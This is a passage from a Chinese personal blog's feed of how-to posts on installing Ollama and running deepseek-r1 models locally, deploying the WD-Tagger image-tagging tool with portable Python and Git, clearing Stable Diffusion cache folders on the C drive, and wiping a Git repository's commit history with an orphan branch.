模型库（国内访问不佳），直接下载 GGUF 格式模型</td><td>支持自定义 Modelfile，可微调模型，社区提供预训练模型</td></tr><tr><td>硬件加速</td><td>支持 CPU/GPU 混合计算（Metal/CUDA）</td><td>自动优化 GPU 计算，支持 CUDA/ROCM/Metal，多模型并行运行更高效</td></tr><tr><td>第三方调用</td><td>功能封闭，不支持 API 调用</td><td>提供与 OpenAI 兼容的 API</td></tr><tr><td>隐私与部署</td><td>完全离线运行，数据不联网，适合对隐私要求高的场景</td><td>本地部署，也可以内网穿透</td></tr><tr><td>适用场景</td><td>个人快速体验本地模型</td><td>开发者调试、企业私有化部署、多模型混合推理</td></tr></tbody></table><h2 id="Ollama-安装与配置">Ollama 安装与配置</h2><p>Ollama 是一个开源的 LLM（大型语言模型）工具，旨在提供可定制化的 AI 体验，支持用户自定义模型并进行本地部署。它的官网首屏中间只有一句话：Get up and running with large language models（启动并运行大型语言模型）。</p><p>首先进入 Ollama 官网 <a href="https://ollama.com/" rel="external nofollow noreferrer">https://ollama.com/</a>，点击<code>Download</code>按钮，选择适合自己设备平台的安装包下载。</p><p>速度实在有亿些些慢，如果你有 GitHub 加速工具，也可以去它的官方仓库 <a href="https://github.com/ollama/ollama" rel="external nofollow noreferrer">https://github.com/ollama/ollama</a> 下载最新的 Release。</p><p>之后双击下载好的<code>OllamaSetup.exe</code>安装。有些 Windows 用户不喜欢将其安装在 C 盘，却发现安装程序没有让你选择安装路径的余地，可以这么操作：</p><ol><li>从文件资源管理器进入<code>OllamaSetup.exe</code>所在的目录（图中为演示，不一定需要这个目录名称）；</li><li>在文件资源管理器上方的文件路径中输入<code>CMD</code>（不要有多余的东西），并回车，即在当前目录下打开命令提示符；</li><li>执行以下命令，其中<code>OllamaSetup.exe</code>是安装包的名称，<code>E:\Ollama</code>是你希望它安装的路径，二者需根据自己需求酌情修改：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OllamaSetup.exe /DIR=E:\Ollama</span><br></pre></td></tr></table></figure><ol start="4"><li>等待进入安装界面，点击安装程序中的 Install 后，看到 Ollama 的安装目录变成了上面指定的目录，则表明成功。</li></ol><p><img src="https://s2.loli.net/2025/02/04/Eu4Xqb8gdAjnm2R.png" alt=""></p><p>如果安装时提示某某文件无法复制之类的错误，建议重新下载安装包。</p><p>如果你已经把 Ollama 装到 C 盘但又不想重新安装，请找到这个目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\%USERNAME%\AppData\Local\Programs\Ollama</span><br></pre></td></tr></table></figure><p>将其移动至你希望它所在的位置（以<code>E:\Ollama</code>为例）。若你之前还下载过模型，可以将<code>C:\Users\%USERNAME%\.ollama\models</code>这样的目录也移动至新位置（以<code>E:\OllamaModels</code>为例）。然后进入 Windows 的<code>设置</code>-&gt;<code>系统</code>-&gt;<code>关于</code>-&gt;<code>高级系统设置</code>（底下“相关设置”中），在系统属性弹窗中点击<code>环境变量</code>。</p><p>在<code>用户变量</code>（上方的）框内，找到变量<code>Path</code>并点击<code>编辑</code>，找到原来 Ollama 的路径，将其替换为新的路径（示例中为<code>E:\Ollama</code>），然后点击窗口底下的“确定”。</p><p>随后在<code>系统变量</code>框内修改变量名<code>OLLAMA_MODELS</code>的变量值为新的模型路径名（示例中为<code>E:\OllamaModels</code>）；首次使用或没有该项的则新建一个。</p><p><img src="https://s2.loli.net/2025/02/04/ahdgixOuF8HfNYl.png" alt=""></p><p>完成后重启系统，随后在 CMD 中执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama</span><br></pre></td></tr></table></figure><p>如果后面显示了 Ollama 的命令用法，则表明配置成功。已经下载过模型而后又迁移路径的，可以执行这段命令查看迁移效果（列出本地模型）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama list</span><br></pre></td></tr></table></figure><p>至此，Ollama 配置完成。</p><h2 id="下载模型">下载模型</h2><p>还是进入 Ollama 官网 <a href="https://ollama.com/" rel="external nofollow noreferrer">https://ollama.com/</a>，在顶部 Search models 框内输入你想要的模型的名称，如有则表明其支持。在这里，我们以 <a href="https://ollama.com/library/deepseek-r1" rel="external nofollow noreferrer">deepseek-r1</a> 模型为例。</p><p>根据自己设备选择合适的模型：</p><ul><li>8G 内存：1.5B （1.1GB 左右大小）</li><li>16G 内存：8B（4.9GB 左右大小）</li><li>32G 内存：14B（9GB 左右大小）</li><li>64G 内存：32B（20GB 左右大小）</li></ul><p>其实这些都是蒸馏后的模型，数据量、“深度思考”能力、逻辑能力等都远不及 671B 那个原版的模型，但原版模型仅储存占用就 404GB，其对硬件要求也很高，一般家用电脑跑不起来。</p><p><img src="https://s2.loli.net/2025/02/04/UYQdKPrhq498LND.png" alt=""></p><p>选择合适的模型后，复制命令，粘贴到 cmd 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>如果本地没有该模型，则会自动下载；若没有自动触发下载，也可以使用<code>ollama pull deepseek-r1:8b</code>命令。</p><p>这个过程比较漫长，如果发现下载速度奇慢，可以尝试<code>Ctrl</code>+<code>C</code>取消下载，之后重新执行命令，可以继续执行上一次的下载任务（但不要在中途关闭命令窗口）。</p><p>下载完成后，执行命令运行模型（和前面那个一样，这次因为本地已有模型，可以调用并运行）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>当进入交互式命令行界面时，可以直接与模型对话，这表明部署成功。</p><h2 id="图形界面">图形界面</h2><p>这样虽然可以直接使用，但对于大多数人而言，图形化界面更易于使用。好在，Ollama 有一系列的周边工具，提供了图形化的操作界面。目前网上大致有这些工具：</p><table><thead><tr><th>名称</th><th>核心亮点</th><th>适用场景</th></tr></thead><tbody><tr><td>Open WebUI</td><td>企业级功能，支持知识库检索</td><td>团队协作、需结合内部文档的智能问答系统</td></tr><tr><td>LobeChat</td><td>多模态交互（图片/语音）、插件生态（联网搜索/代码执行），界面美观</td><td>个人全能助手、多模型切换（支持ChatGPT/Ollama混合使用）</td></tr><tr><td>Chatbox</td><td>轻量级跨平台，开箱即用，支持离线模式</td><td>教育演示、低资源运行模型</td></tr><tr><td>Enchanted</td><td>苹果生态原生优化，隐私优先</td><td>macOS、iOS 用户（追求无缝体验），有多设备同步的需求</td></tr><tr><td>NextJS UI</td><td>极简浏览器交互，Markdown渲染优化，资源占用低</td><td>开发者临时调试、追求极简设计的用户</td></tr></tbody></table><p>下面这些工具是我已经使用过的：</p><h3 id="Page-Assist">Page Assist</h3><p>Page Assist 是一个本地 AI 模型的 Web UI，项目地址为 <a href="https://github.com/n4ze3m/page-assist" rel="external nofollow noreferrer">https://github.com/n4ze3m/page-assist</a>。作者提供了 Chrome 和 Firefox 扩展商店的链接（暂无 Edge）：</p><ul><li><a href="https://chrome.google.com/webstore/detail/page-assist/jfgfiigpkhlkbnfnbobbkinehhfdhndo" rel="external nofollow noreferrer">Chrome 扩展链接</a>（需要“魔法”）</li><li><a href="https://addons.mozilla.org/en-US/firefox/addon/page-assist/" rel="external nofollow noreferrer">Firefox 扩展链接</a></li></ul><p>受限于网络条件，此处以 Firefox 为例。安装后打开扩展，点击右上角的齿轮，进入设置，修改语言。之后回到主界面，在顶部选择模型，即可开始对话。</p><p><img src="https://s2.loli.net/2025/02/04/WePl87gLCDujRXc.png" alt=""></p><h3 id="Chatbox">Chatbox</h3><p>进入<a href="https://chatboxai.app/zh" rel="external nofollow noreferrer">https://chatboxai.app/zh</a>，下载适合自己设备的安装包，并安装软件。</p><p>在软件界面选择<code>使用自己的 API Key 或本地模型</code>，选择<code>Ollama API</code>，设置相应参数和选项，点击<code>保存</code>。后续想要修改设置，可以在软件左下角<code>设置</code>中修改。</p><p><img src="https://s2.loli.net/2025/02/04/tT4gLMKcmar9k5V.png" alt=""></p><h3 id="AingDesk">AingDesk</h3><p>项目链接：<a href="https://github.com/aingdesk/AingDesk" rel="external nofollow noreferrer">AingDesk</a>。逛 GitHub 时发现的，使用前需要配置好 Ollama，若无则首次使用会提示“安装模型管理器”。</p><p>它的模型管理功能我比较喜欢（图形化，懒得敲命令）。在这里可以直接搜索 Ollama 支持的模型与相应的介绍链接，比较方便。（界面截图就不贴了）</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提示词反推工具 WD-Tagger 本地部署</title>
      <link href="/posts/3944900396/"/>
      <url>/posts/3944900396/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在我的设备上，ComfyUI 中的 WD-Tagger 无法正常工作，但在 WebUI 中的可以。</p><p>按照网上的教程在 ComfyUI 中重装 onnxruntime 未果，继续找寻，发现了 HuggingFace 上的一个 <a href="https://huggingface.co/spaces/SmilingWolf/wd-tagger" rel="external nofollow noreferrer">演示站</a>。与插件版相比有所不同，但基础的部分是一样的，都是上传图片，选择模型，分析提示词。</p><!--<iframesrc="https://smilingwolf-wd-tagger.hf.space"frameborder="0"width="100%"height="400"></iframe>--><p>有时我只想简单地用 WD 标签器分析下图片的标签而不是立即绘图，不想仅仅为了这个目的而启动 WebUI（虽说反推图像提示词不一定要 WD 标签器）；在线运行受到网络条件限制，那就在本地部署一份。</p><h2 id="环境配置">环境配置</h2><p>此节的 Python 和 Git 配置流程不是完整的配置流程，只能达到运行 wd-tagger 的目的。如非必要，建议走正常安装的流程，可以避免许多问题。如果你有全局 Python 环境和 Git，或是使用了环境隔离工具（例如 Anaconda），那么可以直接跳过此节。</p><p>另外，建议全程准备加速器，例如 <a href="https://steampp.net/" rel="external nofollow noreferrer">Watt Toolkit</a>（目前它还能加速 HuggingFace）。</p><p>路径以<code>E:\wd-tagger</code>为例。</p><h3 id="Python">Python</h3><p>先配置 Python 环境，可以前往 <a href="https://www.python.org/" rel="external nofollow noreferrer">Welcome to Python.org</a> 选择与自己系统匹配的版本；也可以安装 <a href="https://www.anaconda.com/" rel="external nofollow noreferrer">Anaconda</a>，更方便地管理 Python 环境。此二者配置较为简便，不在此赘述。如果你选择正常安装 Python 环境，则从上面两个链接选一并按照安装程序和文档进行配置，然后直接阅读本文下一节。</p><p>但有时考虑到便携、纯净性、Runtime 大小等因素，需要使用嵌入版的 Python（相对于“绿色版”）。前往 <a href="https://www.python.org/downloads/windows/" rel="external nofollow noreferrer">Python Releases for Windows</a> 寻找适合的版本，并找到有<code>Download Windows embeddable package</code>字样的下载链接。这里我们选择 3.10.11 嵌入版作为演示（<a href="https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip" rel="external nofollow noreferrer">amd64 下载链接</a>），将其下载并解压至本地，例如<code>E:\wd-tagger\python</code>。</p><p>Embeddable 版本主打的是便携性，和标准发行版相比精简了很多东西，但绝大部分库仍可在此环境下运行。仅为了运行 wd-tagger 则不需要特别配置环境变量、Tkinter 等，但是 pip 还是需要的。</p><p>前往 <a href="https://pypi.org/project/pip/" rel="external nofollow noreferrer">pip · PyPI</a> 页面，<s>点击<code>Project description</code>-&gt;<code>Installation</code>-&gt;跳转页面中<code>get-pip.py</code>一节</s>，将 <a href="https://bootstrap.pypa.io/get-pip.py" rel="external nofollow noreferrer">https://bootstrap.pypa.io/get-pip.py</a> 文件保存至 Python 根目录（<code>E:\wd-tagger\python\get-pip.py</code>）。</p><p>另外，在这个目录下还有一个<code>python310._pth</code>文件（文件名因 Python 版本不同而有差异），使用文本编辑器打开，将<code>import site</code>前的井号去掉后保存（加减号为 diff 代码块标记，实际编辑时删去减号所在行、添加加号所在行，不要待最前面的加减号，删去加减号后缩进正确，下同）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python310.zip</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"># Uncomment to run site.main() automatically</span><br><span class="line"><span class="deletion">-#import site</span></span><br><span class="line"><span class="addition">+import site</span></span><br></pre></td></tr></table></figure><p>随后在 Python 目录下打开 CMD，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\wd-tagger\python\python.exe get-pip.py</span><br></pre></td></tr></table></figure><p>等待 pip 安装完成。</p><h3 id="Git">Git</h3><p>前往 <a href="https://git-scm.com/" rel="external nofollow noreferrer">Git</a> 官网下载适合自己系统的版本并安装。Linux 上自带 git 而 Windows 不然。如果你选择正常安装 Git，则从官网下载安装包并按照安装程序和文档进行配置，然后直接阅读本文下一节。</p><p>如果你追求便携，同样的，git 也有便携版（git-portable）。在官网中下载<code>64-bit Git for Windows Portable</code>这个版本（自备 GitHub 加速工具），将其解压至本地，例如<code>E:\wd-tagger\git</code>。</p><h2 id="拉取与初始化">拉取与初始化</h2><p>前往 <a href="https://huggingface.co/spaces/SmilingWolf/wd-tagger" rel="external nofollow noreferrer">WaifuDiffusion Tagger</a>，在顶部找到三个点的按钮，在下拉菜单中点击<code>Clone repository</code>。</p><p><img src="https://s2.loli.net/2025/01/06/c7KW3wrZURvYje1.png" alt=""></p><p>进入<code>E:\wd-tagger</code>目录，打开 Git Bash，执行命令（井号后是注释，仅为说明，无需输入，下同）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install <span class="comment"># 便于处理大文件</span></span><br><span class="line">git <span class="built_in">clone</span> https://huggingface.co/spaces/SmilingWolf/wd-tagger <span class="comment"># 将该项目 Clone 至本地。请自备加速器解决 HF 的连接问题</span></span><br></pre></td></tr></table></figure><p>如果使用的是便携版 Git，则通过文件资源管理器进入此目录，在顶部地址栏中输入<code>cmd</code>并回车，即可在此目录下打开 CMD 窗口，并使用<code>git.exe</code>的路径替换命令中的<code>git</code>，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\wd-tagger\git\bin\git.exe lfs install <span class="comment"># git.exe 的路径因版本不同而有差异，请根据自己的情况酌情修改。此处示例是 2.47.1 便携版本</span></span><br><span class="line">E:\wd-tagger\git\bin\git.exe <span class="built_in">clone</span> https://huggingface.co/spaces/SmilingWolf/wd-tagger</span><br></pre></td></tr></table></figure><p>理论上这个 wd-tagger 目录中有以下文件（<code>.git</code>文件夹省略）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">│  .gitattributes</span><br><span class="line">│  .gitignore</span><br><span class="line">│  app.py</span><br><span class="line">│  power.jpg</span><br><span class="line">│  README.md</span><br><span class="line">│  requirements.txt</span><br></pre></td></tr></table></figure><p>在<code>wd-tagger</code>目录下打开 CMD，执行命令安装依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\wd-tagger\python\python.exe -s -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>（<code>-m</code>会使得其使用指定的 Python 解释器来运行该模块，无需手动指定 pip 路径）</p><p>安装完后注意一下，<code>onnxruntime</code>版本需至少为 1.17.0；如果出现缺失模块等报错，按照前面的方式补充安装相应的依赖，之后再尝试启动。。接下来只需通过 Python 运行 <a href="http://app.py" rel="external nofollow noreferrer">app.py</a>，等待一会便可通过<code>127.0.0.1:7860</code>访问 wd-tagger 的 webui 界面了。</p><h2 id="启动脚本">启动脚本</h2><p>为了方便启动，可以编写一个脚本完成这些工作。这里是我自用的启动脚本，将以下代码复制到文本文档中，并将文本文档另存为<code>.bat</code>文件（路径请根据实际情况修改）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>  E:\wd-tagger</span><br><span class="line"><span class="built_in">set</span> HF_ENDPOINT=https://hf-mirror.com</span><br><span class="line"><span class="built_in">set</span> GRADIO_SERVER_PORT=7861</span><br><span class="line"><span class="built_in">set</span> HF_HOME=E:\wd-tagger\hf_home</span><br><span class="line">E:\wd-tagger\python\python.exe app.py</span><br></pre></td></tr></table></figure><p>（这里只记录了我使用的参数）逐行看下：</p><ol><li>切换当前工作目录到<code>E:\wd-tagger</code>，后续的命令将在这个目录下执行；</li><li>由于国内网络的原因，无法直连 HuggingFace，因此我们需要手动设置地址，如 hf-mirror 镜像站。将环境变量 <code>HF_ENDPOINT</code> 的值设置为 <code>https://hf-mirror.com</code>，用于指定 Hugging Face 的镜像地址；</li><li>Gradio 默认监听端口为 7860，为防止与其他同样使用此端口的程序冲突，可以设置 GRADIO_SERVER_PORT 环境变量，将 Gradio 的监听的端口设置为其他值，例如<code>7861</code>；</li><li>在Windows 系统中，HuggingFace 默认储存路径为<code>C:\Users\【用户名】\.cache\huggingface\hub</code>。为方便管理，此处可以设置 HF_HOME 环境变量，指定 Hugging Face 的存储路径为<code>E:\wd-tagger\hf_home</code>（需要自己创建这个路径）；</li><li>执行<code>app.py</code>，使用<code>E:\wd-tagger\python\python.exe</code>作为 Python 解释器，启动 webui 界面 。</li></ol><p>中间那些命令是设置自定义参数的，非启动程序所必需。按照这个脚本，启动后需在浏览器输入<code>127.0.0.1:7861</code>以打开 webui 界面。</p><h2 id="使用">使用</h2><p>此时本地还没有推理模型。在 webui 中选择模型后，首次使用会连接 HuggingFace 下载选中的模型，之后使用都从本地读取。如果按照前一节那个示例脚本启动程序，那么这些模型会被下载到前面设置的<code>hf_home</code>目录内对应的文件夹中。</p><p>这一步对网络要求较高，而且模型文件较大；如果下载失败，可以多试几次。嫌速度慢的，可以手动下载，然后放入 HF 缓存文件夹相应目录中。为了方便说明，此处以 wd-vit-tagger-v3 模型为例。先前往 <a href="https://hf-mirror.com/SmilingWolf" rel="external nofollow noreferrer">SmilingWolf</a>（作者主页，此处为镜像站链接）选择适合的模型，下载<code>model.onnx</code>和<code>selected_tags.csv</code>备用。</p><p><img src="https://s2.loli.net/2025/01/06/YH4JT83exVvSaUd.png" alt=""></p><p>在 webui 中选择模型并点击<code>Submit</code>按钮，当<code>E:\wd-tagger\hf_home\hub</code>中创建相应文件夹后关闭程序（文件夹命名形式类似于<code>models--SmilingWolf--wd-vit-tagger-v3</code>），其中结构大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:.</span><br><span class="line">+---blobs</span><br><span class="line">|       【省略】</span><br><span class="line">|</span><br><span class="line">+---refs</span><br><span class="line">|       【省略】</span><br><span class="line">|</span><br><span class="line">\---snapshots</span><br><span class="line">    \---7f6b584d……【对于不同的模型，此处名称有所不同】</span><br><span class="line">            【省略】【正常情况下，模型和 tags 在此文件夹内】</span><br></pre></td></tr></table></figure><p>该文件夹中 snapshots 目录内有名称为字母数字混合的文件夹（大致是校验码和软链接，不理解也不影响使用），对于本文选用的反推工具而言，完整下载过程结束后，相应的<code>model.onnx</code>和<code>selected_tags.csv</code>会出现在这个目录内。此时只需将<code>snapshots</code>中字符文件夹内的文件删除，将前面提前下载好的<code>model.onnx</code>和<code>selected_tags.csv</code>移动至此，重启程序脚本，选中即可正常使用该模型。</p><h2 id="后记">后记</h2><p>之前用着没什么问题，后来不知为何，设置了 <a href="https://hf-mirror.com" rel="external nofollow noreferrer">hf-mirror.com</a> 镜像源后，选择缺失的模型时，没有按预期自动下载，而是出现红色“错误”字样，命令行抛出错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">huggingface_hub.errors.RepositoryNotFoundError: 401 Client Error. (Request ID: XXXXX)</span><br><span class="line"></span><br><span class="line">Repository Not Found for url: XXXXX.</span><br><span class="line">Please make sure you specified the correct `repo_id` and `repo_type`.</span><br><span class="line">If you are trying to access a private or gated repo, make sure you are authenticated.</span><br><span class="line">Invalid credentials in Authorization header</span><br></pre></td></tr></table></figure><p>还原为原有的地址，虽然不是这段错误，但仍然无法下载。看起来像是需要 Token，但截止目前，无论是原站还是镜像站，这十二个反推模型都是可以直接访问并下载的，似乎不一定需要 Token。后来一想，既然检测 Token 不过，直接访问不需要 Token，那去掉检测会发生什么：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># wd-tagger 内 app.py 文件（部分片段）</span><br><span class="line"># 省略代码</span><br><span class="line"></span><br><span class="line">    def download_model(self, model_repo):</span><br><span class="line">        csv_path = huggingface_hub.hf_hub_download(</span><br><span class="line">            model_repo,</span><br><span class="line">            LABEL_FILENAME,</span><br><span class="line"><span class="deletion">-            use_auth_token=HF_TOKEN,</span></span><br><span class="line">        )</span><br><span class="line">        model_path = huggingface_hub.hf_hub_download(</span><br><span class="line">            model_repo,</span><br><span class="line">            MODEL_FILENAME,</span><br><span class="line"><span class="deletion">-            use_auth_token=HF_TOKEN,</span></span><br><span class="line">        )</span><br><span class="line">        return csv_path, model_path</span><br><span class="line"></span><br><span class="line"># 省略代码</span><br></pre></td></tr></table></figure><p>（好像正常了，可以自动下载缺失的模型。之后自动下载或手动下载替换的操作就和先前一样了）</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stable Diffusion 占 C 盘空间，如何清理缓存文件</title>
      <link href="/posts/2316115979/"/>
      <url>/posts/2316115979/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用了一段时间 SD-WebUI 后，发现 C 盘空间急剧减少。终止程序和网页后会释放一些，但效果有限。随后发现 Python 和 Huggingface 会在 C 盘生成缓存文件，模型和依赖下载多了，缓存也就大了。</p><p>C 盘内有很多系统文件，若不慎误删可能造成未知影响，故在此记录清除 Stable Diffusion 缓存文件的方法。为了方便起见，下文将“Stable Diffusion”简称为“SD”。</p><hr><p>通常情况下，SD 程序中 Python 会在 C 盘下创建 pip 缓存路径，而通过 SD 从 HuggingFace 下载依赖或镜像，则会创建在 cache 缓存路径中创建文件夹。如果下载的文件较多，长久积累，这两处的占用空间会愈发庞大，尤其是后者。那么接下来就是导航到这两个位置，删除相应的缓存目录。</p><p>Python 缓存路径位于<code>C:\Users\【用户名】\AppData\Local\pip</code>中，用户名需要根据自己设备实际情况填写；也可以在文件资源管理器的地址栏输入以下路径快速找到 Python 的 cache 文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%LocalAppData%\pip</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/14/NgTS1RpPrcKvHOl.png" alt=""></p><p>删除 cache 文件夹里面的文件即可，cache 文件夹保留。然后导航到 HuggingFace 所在缓存路径，位于<code>C:\Users\【用户名】\.cache</code>中，也可以在文件资源管理器的地址栏输入以下路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%HOMEPATH%\.cache</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/14/7r2qQtkW1uY4ZKl.png" alt=""></p><p>其中的 gdown、huggingface、selenium、torch 四个文件夹里面的是 SD 运行时或配置环境时产生的缓存文件，文件夹里面的东西可以删除，但文件夹最好保留。</p><p>这些文件被删除后在下次配置和下载时还会再次产生，可以定期清理。</p><p>也可以在 Win10 设置中进行操作。使用 <code>Win</code>+<code>i</code>打开设置，进入<code>系统</code>-&gt;<code>存储</code>-&gt;<code>其他</code>文件夹，在里面找到并删除 pip 的 cache 和 huggingface 相关文件夹内的文件即可。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清空 Git 仓库历史提交记录</title>
      <link href="/posts/3956464248/"/>
      <url>/posts/3956464248/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>将 Hexo 托管在 GitHub Pages 上，使用 Git 比较方便，但因为以前常在未经充分测试的情况下就推送更新，导致反复提交，使得仓库的提交历史十分混乱。同时，有些东西在后来因过时等原因而不想展示，但却可能在历史记录中被查看。</p><p>删了重建？也是一个办法，但如果基于以前的仓库继续更新，可以保留仓库的部分属性，省去很多麻烦（尤其是我有些仓库的项目还被用于 Vercel、CF 等平台的拉取部署）。</p><p>有没有办法在不删除原仓库的前提下，清除所有历史提交记录？</p><h2 id="检查（建议）">检查（建议）</h2><p>进入本地 Git 仓库的目录，打开 Bash 终端，执行命令查看当前仓库关联的远程仓库的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><p>在 Windows 中，对于 Hexo 而言，推送仓库在其根目录下的<code>.deploy_git</code>文件夹中（隐藏文件夹，请在文件资源管理器中将其设置为可见）。那么我们就需要在此文件夹中右键打开 Git Bash，执行上述命令，检查远程仓库信息，确保是你的目标仓库。</p><h2 id="创建新分支">创建新分支</h2><p>我们需要创建一个干净的分支，使用以下命令创建并切换（此处我们将其命名为<code>trans_branch</code>以为示例，但你可以自定义，只需保持后面使用的名称相同）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan trans_branch</span><br></pre></td></tr></table></figure><p>我们来分解一下：</p><ul><li><code>git checkout</code>: 用于在 Git 中切换分支或恢复工作树文件。</li><li><code>--orphan</code>: 创建一个新的分支，但不继承当前分支的提交历史，所有的文件会被视为“未跟踪”。也就是说，此时这个分支没有任何历史记录（即“孤立”分支）。</li><li><code>trans_branch</code>: 新分支的名称（不能和以前的分支名称重复）。</li></ul><h2 id="添加与推送">添加与推送</h2><p>此时的<code>trans_branch</code>还没有历史记录，不会对当前的提交产生影响。接下来，我们需要将所有的文件（包括新文件、已修改的文件和已删除的文件）添加到暂存区，准备提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add -A</span><br></pre></td></tr></table></figure><p>此目录下的<code>.gitignore</code>文件中声明排除的不会被添加（不一定有这个文件，它用于排除目录或文件）。你也可以使用<code>git add .</code>，但<code>git add -A</code>会将删除的文件也纳入考虑，这样可以确保所有的更改都被记录在暂存区不会丢失任何未提交的删除操作。</p><p>添加完后，准备提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;clean&quot;</span></span><br></pre></td></tr></table></figure><p>逐步看下：</p><ul><li><code>git commit</code>: 将暂存区中的更改提交到版本库。每次提交都会记录一个快照，形成历史记录。</li><li><code>-m</code>: 允许在命令行中直接提供提交信息，而无需打开文本编辑器。</li><li><code>&quot;clean&quot;</code>: 为此次提交提供的描述信息（不一定要写 clean，你也可以写别的，但要双引号）。</li></ul><h2 id="替换分支">替换分支</h2><p>现在我们可以将原来的主分支删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -D main</span><br></pre></td></tr></table></figure><ul><li><code>git branch</code>: 这个命令用于管理分支，包括创建、删除和列出分支。</li><li><code>-D</code>: 命令中<code>-d</code>用于删除分支，但在分支有未合并的更改时会阻止删除；<code>-D</code>则会忽略这个检查，强制删除分支。</li><li><code>main</code>: 将要删除的分支的名称（此仓库创建时已经默认主分支名为 main 了，如果你的仓库创建得比较早，可能不是这个名称）。</li></ul><p>默认情况下 master 是 Git 仓库的主要分支，后来是 main，也可能是其他的（以你设置的为准）。这需要你自己去查看，如果原来的主分支不是 master 则需要替换。</p><p>有些仓库虽然主分支名称是 main，实际直接删除时显示没有此分支，可以换 master 